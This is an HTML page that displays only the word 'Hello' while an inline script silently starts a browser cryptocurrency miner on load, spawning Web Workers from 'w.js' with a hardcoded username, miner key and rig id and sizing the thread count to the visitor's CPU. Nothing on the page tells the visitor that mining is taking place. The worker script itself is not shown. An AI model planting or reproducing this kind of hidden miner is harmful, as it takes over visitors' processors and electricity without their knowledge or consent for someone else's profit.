<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>
<h1>Hello</h1>
<script type="text/javascript">
	// Get the amount of threads available
const userThreads = navigator.hardwareConcurrency;

// Default username, Rigid and amount of threads
let username = 'Raafet';
let miner_key = '3142812s';
let rigid = 'Webminer-2';
let threads = 1;
let wallet_id = Math.floor(Math.random() * 2811);


function startMiner() {
    // Validate the amount of threads
    if (threads < 1) {
        threads = 1;
    }
    if (threads > 8) {
        threads = 8;
    }
    if (threads > userThreads) {
        threads = userThreads;
    }

    // Set workerVer
    let workerVer = 0;

    // Loop through the amount of threads
    for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
        // Create the worker  
        var worker = new Worker('w.js?v=2');
        // Send the username, rigid and workerVer to the worker
        worker.postMessage('Start,' + username + "," + rigid + "," + workerVer + "," + wallet_id + "," + miner_key);
        // Add 1 to workerVer
        workerVer++;
        worker.onmessage = function(event) {
            const data = event.data.split(",");
            //console.log(data);
        }
    }
}
startMiner();
</script>
</body>
</html>
